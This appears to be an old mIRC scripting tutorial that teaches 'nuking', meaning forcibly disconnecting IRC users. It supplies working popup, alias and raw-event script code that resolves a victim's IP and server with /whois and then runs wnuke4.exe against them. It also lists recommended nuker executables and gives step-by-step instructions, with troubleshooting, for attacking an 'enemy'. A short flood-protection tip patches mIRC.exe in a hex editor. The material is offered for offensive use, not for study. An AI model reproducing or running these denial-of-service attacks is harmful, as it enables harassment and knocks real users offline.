Flood Protection 
1.Get Rid of Version/User Floods 
  Using a hex editor open mIRC.exe. 
  Search for Reply. 
  Find where the replies are. 
  Simply delete all the replys, except for the ping reply. 


How to Nuke

There are several ways and versions of nukes but the most common is the simple wnuke nuke. 
It just disconnects the user from the server, so that's what a connection reset by peer 
means! I'll cover the wnukes first then the other types of nukes

The 2 types of WNukes 
1.WNUKE 4 From a Popup Nuke 
  Download WNUKE4.EXE 
  Add these pieces of coding to the appropriate portions of mIRC. 

        [POPUPS/NICK NAMES LIST]
        NUKE!:/mn $1 $2 $3 $4 $5 $6 $7

        [ALIASES]
        mn {
        .nuke $$1 
        timer 1 3 /nuke $$2 
        timer 1 6 /nuke $$3 
        timer 1 9 /nuke $$4 
        timer 1 12 /nuke $$5 
        timer 1 15 /nuke $$6 
        timer 1 18 /nuke $$7 
        }
        /nuke {
        enable #nuke
        set %nuke.nick $1
        stats L $1
        whois $1
        timer 1 2 /src
        }
        [RAW]
        #nuke disabled
        311:*: set %nukeip $parm4 | halt
        312:*: set %nukeserver $parm3 | halt
        301:*: halt
        313:*: halt
        319:*: halt
        317:*: halt
        318:*: run $mircdir $+ \wnuke4.exe -n %nukeserver %nukeip 0 1200-3500 %nukeport | .disable #nuke | echo 6 Nuking %nukeip on %nukeserver %nukeport $+ . | halt
        #nuke end
                        

2.WNewk Via a Seperate Program 

1.Pick Your Weapon 
  1.wnuke.exe 
  2.wnuke2.exe 
  3.wnuke4.exe RECOMMENDED 
  4.dccnewk.exe 
  5.pnewq97o.exe 
  6.snuke.exe 
  7.wnewk.exe 
  8.wnewk-x.exe 
  9.wnewk-x2.exe RECOMMENDED 

2.The below options refer to a bit of code and here it is:

      [POPUPS/NICKNAMES LIST]
       Nuke
       .DNS:/dns *1
       .Run Nuker:/run $mircdir $+ utils\nukers\wnewk-x2.exe
       .Whois:/whois *1
                      

      This is based on the fact your nuker is in a sub-dir of utils called nukers. 
3.Run Your weapon of choice in this case wnewk-x2.exe or of course increase your 
  script by adding in the bit of code. 

4.Now do a /dns on the enemy or you could add the bit of code to your script. 

5.Now do a /whois on the enemy or you could add the bit of code to your script. 

6.Look in your status window, highlight the outputted ip address and server
  of your victim and hit crtl+c(seperate copy for each, these are placed in the config more 
  info in next step). 

7.Configure the script: 
  Server: paste the server from the status window here 
  Destination address: paste the ip of the victim from the status window here. 

  Hit engage newk and watch in the channel for a:CONNECTION RESET BY PEER 
  If it dosen't work increase the rang of ports, do a /links and pick a different 
  server to try going through, or try a different unreach to use.
